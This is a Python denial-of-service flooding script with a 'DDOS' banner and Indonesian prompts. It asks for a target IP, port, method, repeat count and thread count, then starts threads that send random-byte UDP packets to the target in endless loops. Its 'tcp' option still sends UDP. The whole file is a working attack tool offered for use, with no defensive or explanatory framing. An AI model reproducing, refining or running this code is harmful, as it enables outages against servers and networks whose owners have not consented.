import socket
import threading
import os
import random

os.system("cls" if os.name == "nt" else "clear")

print("""
\033[91m
██████╗ ██████╗  ██████╗ ███████╗
██╔══██╗██╔══██╗██╔═══██╗██╔════╝
██║  ██║██║  ██║██║   ██║███████╗
██║  ██║██║  ██║██║   ██║╚════██║
██████╔╝██████╔╝╚██████╔╝███████║
╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝
""")

ip = input("MASUKAN IP : ")
port = int(input("MASUKAN PORT : "))
choice = input("METHODS (udp/tcp) : ").strip().lower()
times = int(input("MASUKAN TIMES : "))
threads = int(input("MASUKAN THREAD : "))

def attack(packet_size):
    data = os.urandom(packet_size)
    tag = random.choice(("[×]","[•]","[√]"))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            addr = (ip, port)
            for _ in range(times):
                s.sendto(data, addr)
            print(f"{tag} MENGIRIM KE IP {ip} PORT {port}")
        except Exception as e:
            print(f"[!] ERROR: {e}")
        finally:
            s.close()

packet_size = 646 if choice == 'udp' else 656
for _ in range(threads):
    th = threading.Thread(target=attack, args=(packet_size,))
    th.start()
